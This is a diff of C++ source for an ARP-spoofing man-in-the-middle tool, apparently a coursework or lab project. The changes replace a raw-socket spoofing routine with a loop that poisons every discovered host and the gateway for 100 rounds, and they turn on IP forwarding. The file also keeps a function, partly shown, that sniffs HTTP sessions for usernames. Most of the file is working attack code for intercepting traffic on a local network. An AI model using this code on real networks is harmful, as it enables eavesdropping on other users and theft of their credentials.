@@ -13,75 +13,39 @@
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <linux/if_packet.h>
+#include <linux/tcp.h>
+#include <linux/ip.h>
+#include <time.h>
 
-#include "scan.h"
 #include "arp.h"
-#include "pharm_attack.h"
+#include "scan.h"
+#include "spoof.h"
+#include "mitm_attack.h"
 
 using namespace std;
 
-void arp_spoofing(string local_ip, string local_mac, string gateway_ip, vector<pair<string, string>> answered_list){
-
-    //creat raw socket
-    int sockfd = socket(AF_PACKET,SOCK_RAW, htons(ETH_P_ARP));
-    if (sockfd <0) {
-        perror ("socket() failed");
-        exit (EXIT_FAILURE);
+/**
+ * target all the neighbors in the local network
+ * @param gateway_ip the ip address of gateway in std::string
+ * @param answered_list the list of all the hosts in the local area network
+ * @param spoof_operator the spoof operator
+ */
+void arp_spoofing(string gateway_ip, vector<pair<string, string>> answered_list, SpoofOperator *spoof_operator) {
+    // run for 100 iterations
+    for (int t = 0; t < 100; t++) {
+        std::cout << "spoofing iteration: " << t << std::endl;
+        for (auto i = 0; i < answered_list.size(); i++) {
+            if (answered_list[i].first != gateway_ip) {
+                spoof_operator->attack(answered_list[i].first, gateway_ip);
+                spoof_operator->attack(gateway_ip, answered_list[i].first);
+            }
+        }
+        sleep(2);
     }
-
-    arp_header arp_reply_gateway;
-    arp_header arp_reply_device;
-
-    arp_reply_gateway.htype  = htons(1); //ethernet
-    arp_reply_gateway.ptype  = htons(ETH_P_IP); //IP protocol
-    arp_reply_gateway.hlen   = 6; //MAC address length
-    arp_reply_gateway.plen   = 4; //IP address length
-    arp_reply_gateway.opcode = htons(1); //ARP request
-
-    arp_reply_device.htype  = htons(1); //ethernet
-    arp_reply_device.ptype  = htons(ETH_P_IP); //IP protocol
-    arp_reply_device.hlen   = 6; //MAC address length
-    arp_reply_device.plen   = 4; //IP address length
-    arp_reply_device.opcode = htons(1); //ARP request
-    
-
-    //sender mac is the attacker's mac
-    memcpy(arp_reply_gateway.sender_mac, (void *)ether_aton(local_mac.c_str()), 6);
-    memcpy(arp_reply_device.sender_mac, (void *)ether_aton(local_mac.c_str()), 6);
-
-    //for packet to gateway, target mac is the gateway's mac
-    //target ip is the gateway's ip
-    memcpy(arp_reply_gateway.target_mac, (void *)ether_aton(local_mac.c_str()), 6);
-    arp_reply_device.target_ip = inet_addr(gateway_ip.c_str());
-
-    //for packet to device, sender ip is the gateway's ip
-    arp_reply_device.sender_ip = inet_addr(gateway_ip.c_str());
-
-    for(auto i = 0; i < answered_list.size(); i++){
-
-        //to gateway
-        arp_reply_gateway.sender_ip = inet_addr(answered_list[i].first.c_str());
-
-        //send packet to gateway
-        sendto(sockfd, &arp_reply_gateway, sizeof(arp_reply_gateway), 0, (struct sockaddr*)&device, sizeof(device));
-
-        //to device
-        memcpy(arp_reply_device.target_mac, (void *)ether_aton(answered_list[i].second.c_str()), 6);
-        arp_reply_device.target_ip = inet_addr(answered_list[i].first.c_str());
-        
-        //send packet to device
-        sendto(sockfd, &arp_reply_device, sizeof(arp_reply_device), 0, (struct sockaddr*)&device, sizeof(device));
-
-    }
-
-    close(sockfd);
-
 }
 
 
-int fetch_username_from_HTTP_session(){
-    
-        
+int fetch_username_from_HTTP_session() {
         int sockfd = socket(AF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
         if (sockfd <0) {
             perror ("socket() failed");
@@ -116,17 +80,19 @@ int fetch_username_from_HTTP_session(){
         return 0;
 }
 
-int main(){
-
+int main() {
     std::string sender_mac, target_mac;
-    std::string sender_ip, netmask, ifname;
+    std::string sender_ip, target_ip, netmask, ifname;
+    std::string gateway_ip;
     
     // iterate through all network interfaces
     // stops if ifname != "lo"
     get_network_interface_info(sender_ip, netmask, sender_mac, ifname);
+    gateway_ip = get_gateway(ifname);
 
     std::vector<std::string> candidates;
     std::vector<std::pair<std::string, std::string>> answered_list;
+    std::map<std::string, std::string> ip2mac_map;
 
     // use ip and netmask to calculate all possible neighbors
     get_host_in_range(sender_ip, netmask, candidates);
@@ -136,7 +102,10 @@ int main(){
     ARPOperator arp_operator(sender_ip, ifname);
 
     // initialize broadcast for neighbor discovery
+    target_mac = "00:00:00:00:00:00";
+
     arp_operator.prepare_broadcast();
+    arp_operator.prepare_header_values();
     for (auto candidate : candidates) {
         arp_operator.set_target(candidate, target_mac);
         arp_operator.send();
@@ -145,7 +114,7 @@ int main(){
     // set timeout
     // don't know how to set the actual timeout window
     arp_operator.clear_buffer();
-    arp_operator.set_timeout(0, 100);
+    arp_operator.set_timeout(2, 0);
     int nbytes;
     std::string host_ip, host_mac;
 
@@ -169,12 +138,34 @@ int main(){
         } else if (arp_operator.get_candidate_response(host_ip, host_mac)) {
             std::cout << host_ip << "\t" << host_mac << std::endl;
             answered_list.push_back(std::make_pair(host_ip, host_mac));
+            ip2mac_map[host_ip] = host_mac;
         }
     }
 
-    string gateway_ip = get_gateway(ifname);
-    arp_spoofing(sender_ip, sender_mac, gateway_ip, answered_list);
+    arp_operator.clear_buffer();
 
+    // choose the first target that is not the gateway
+    std::map<std::string, std::string>::iterator it;
+    for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
+        if (it->first != gateway_ip) {
+            target_ip = it->first;
+            target_mac = it->second;
+        }
+    }
+
+    // initialize the spoof operator
+    SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);
+
+    if (set_ip_forwarding(1) < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    arp_operator.prepare_unicast();
+    arp_operator.prepare_header_values();
+
+    arp_spoofing(gateway_ip, answered_list, &spoof_operator);
+
+    return 0;
 }
 
 
